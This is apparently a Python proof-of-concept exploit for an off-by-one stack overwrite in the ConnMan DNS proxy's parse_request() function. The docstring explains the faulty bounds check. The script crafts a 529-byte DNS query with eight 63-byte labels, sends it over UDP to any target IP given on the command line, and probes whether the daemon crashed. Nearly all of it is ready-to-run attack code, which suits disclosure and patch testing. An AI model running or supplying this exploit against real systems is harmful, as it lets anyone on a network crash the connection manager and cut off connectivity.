#!/usr/bin/env python3
"""
PoC: ConnMan DNS proxy off-by-one stack overwrite (DNS-1)
=========================================================
Bug:  src/dnsproxy.c parse_request(), lines 3177-3181.

      Guard:   if (used + label_len + 1 > size) return -ENOBUFS;
      Then:    strncat(name, ptr+1, label_len);   // NUL at name[used+label_len]
               strcat(name, ".");                 // NUL at name[used+label_len+1]

      When used+label_len+1 == size the guard passes but strcat writes a NUL
      byte one position past the end of the stack buffer query[512].

Expected outcomes
-----------------
  With SSP (-fstack-protector-strong, typical on distro builds):
      __stack_chk_fail() fires → SIGABRT → connman process crashes.
      Repeatable: one crafted UDP datagram per crash.

  Without SSP (common on embedded targets):
      NUL byte lands on the LSB of `req` (NULL-initialized) or `hdr`
      (NULL-initialized) on the UDP path → usually silent.
      TCP path cannot be triggered: the msg_len > TCP_MAX_BUF_LEN
      pre-check at line 3267 rejects the packet before parse_request()
      is reached.

Target
------
  ConnMan DNS proxy listener: UDP port 53, bound to the address of the
  managed network interface (e.g. 192.168.x.1 for a hotspot, or the
  Ethernet interface address).  Any host on the managed LAN can reach it.

Usage
-----
  # From the managed LAN (or the host itself):
  python3 poc_dns1.py <target-ip> [port]

  # Example — same machine, connman listening on 192.168.1.1:
  python3 poc_dns1.py 192.168.1.1

  # Quick self-test if connman is binding on 127.0.0.1 (unusual but possible):
  python3 poc_dns1.py 127.0.0.1

Observe the crash
-----------------
  journalctl -u connman -f            # watch for "stack smashing detected"
  systemctl status connman            # check Active: line after sending
"""

import socket
import struct
import sys
import time


# ---------------------------------------------------------------------------
# DNS packet building
# ---------------------------------------------------------------------------

DNS_HEADER_FMT = ">HHHHHH"   # id, flags, qdcount, ancount, nscount, arcount
DNS_HEADER_LEN = 12           # struct domain_hdr, packed

def build_dns_header(txid: int, rd: bool = True) -> bytes:
    flags = 0x0100 if rd else 0x0000   # standard query, RD=1
    return struct.pack(DNS_HEADER_FMT, txid, flags, 1, 0, 0, 0)


def build_qname_wire(labels: list[bytes]) -> bytes:
    """Encode a list of raw label byte strings into DNS wire format."""
    wire = b""
    for label in labels:
        assert len(label) <= 255
        wire += bytes([len(label)]) + label
    wire += b"\x00"                    # root terminator
    return wire


def build_question(qname_wire: bytes, qtype: int = 1, qclass: int = 1) -> bytes:
    return qname_wire + struct.pack(">HH", qtype, qclass)


# ---------------------------------------------------------------------------
# The trigger packet
# ---------------------------------------------------------------------------
#
# parse_request() copies label bytes into query[512] and tracks progress in
# `used`.  On each iteration:
#
#   if (used + label_len + 1 > 512) return -ENOBUFS;  // guard
#   strncat(name, label_data, label_len);              // NUL at name[used+label_len]
#   strcat(name, ".");                                 // NUL at name[used+label_len+1]
#   used += label_len + 1;
#
# With 8 labels of 63 bytes, iteration 8 enters with used=448:
#   check: 448+63+1 = 512, which is NOT > 512 → guard passes
#   strcat writes NUL at name[512]  ← one byte past query[512]
#
# Total packet size = 12 (header) + 8*(1+63) (labels) + 1 (term) + 4 (qtype+qclass)
#                   = 529 bytes — well inside the 768-byte recvfrom cap.

TRIGGER_LABEL_COUNT = 8
TRIGGER_LABEL_SIZE  = 63          # 8 * (63+1) = 512 → boundary condition
QUERY_BUF_SIZE      = 512         # sizeof query[512] in udp_listener_event


def build_trigger_packet(txid: int = 0xDEAD) -> bytes:
    labels = [b"A" * TRIGGER_LABEL_SIZE] * TRIGGER_LABEL_COUNT
    qname  = build_qname_wire(labels)
    used_at_last_label = (TRIGGER_LABEL_COUNT - 1) * (TRIGGER_LABEL_SIZE + 1)
    final_boundary     = used_at_last_label + TRIGGER_LABEL_SIZE + 1
    assert final_boundary == QUERY_BUF_SIZE, (
        f"Label math wrong: boundary={final_boundary}, expected {QUERY_BUF_SIZE}"
    )
    return build_dns_header(txid) + build_question(qname)


# ---------------------------------------------------------------------------
# A benign query to probe whether connman is alive
# ---------------------------------------------------------------------------

def build_probe_packet(txid: int = 0x1234) -> bytes:
    """Minimal valid query for 'a.b' (A record, IN class)."""
    qname = build_qname_wire([b"a", b"b"])
    return build_dns_header(txid) + build_question(qname)


# ---------------------------------------------------------------------------
# Transport
# ---------------------------------------------------------------------------

def send_udp(ip: str, port: int, data: bytes, timeout: float = 1.5) -> bytes | None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(timeout)
        s.sendto(data, (ip, port))
        try:
            resp, _ = s.recvfrom(4096)
            return resp
        except socket.timeout:
            return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port   = int(sys.argv[2]) if len(sys.argv) > 2 else 53

    print(f"Target : {target}:{port}/udp")
    print(f"Bug    : src/dnsproxy.c parse_request() lines 3177-3181")
    print(f"Effect : NUL byte written to query[{QUERY_BUF_SIZE}] (1 past stack buffer)")
    print()

    # --- Step 1: verify the proxy is reachable with a normal query -----------
    probe = build_probe_packet()
    print(f"[1] Sending probe query ({len(probe)} bytes) …")
    resp = send_udp(target, port, probe)
    if resp is None:
        print("    No response — connman may not be running or port is unreachable.")
        print("    Continuing anyway (response is not guaranteed for unknown names).")
    else:
        print(f"    Got response ({len(resp)} bytes) — proxy is alive.")
    print()

    # --- Step 2: send the trigger packet -------------------------------------
    trigger = build_trigger_packet()
    pkt_labels = TRIGGER_LABEL_COUNT
    pkt_label_sz = TRIGGER_LABEL_SIZE
    print(f"[2] Sending trigger packet ({len(trigger)} bytes)")
    print(f"    Labels : {pkt_labels} × {pkt_label_sz} bytes")
    print(f"    On iteration {pkt_labels}: used({(pkt_labels-1)*(pkt_label_sz+1)}) "
          f"+ label_len({pkt_label_sz}) + 1 = {QUERY_BUF_SIZE} "
          f"(NOT > {QUERY_BUF_SIZE} → guard passes → strcat NUL → query[{QUERY_BUF_SIZE}])")

    send_udp(target, port, trigger, timeout=0.5)   # no response expected if crash
    print()

    # --- Step 3: check whether connman survived ------------------------------
    time.sleep(0.4)   # brief pause for SIGABRT/restart to propagate
    print("[3] Sending follow-up probe to check daemon state …")
    resp2 = send_udp(target, port, build_probe_packet(txid=0x5678))
    if resp2 is not None:
        print(f"    Got response ({len(resp2)} bytes) — daemon still alive.")
        print("    Likely outcomes: SSP not enabled, or NUL landed on already-zero byte.")
    else:
        print("    No response — daemon may have crashed (check journalctl -u connman).")
        print()
        print("    To confirm:")
        print("      journalctl -u connman | tail -20")
        print("      systemctl status connman")


if __name__ == "__main__":
    main()
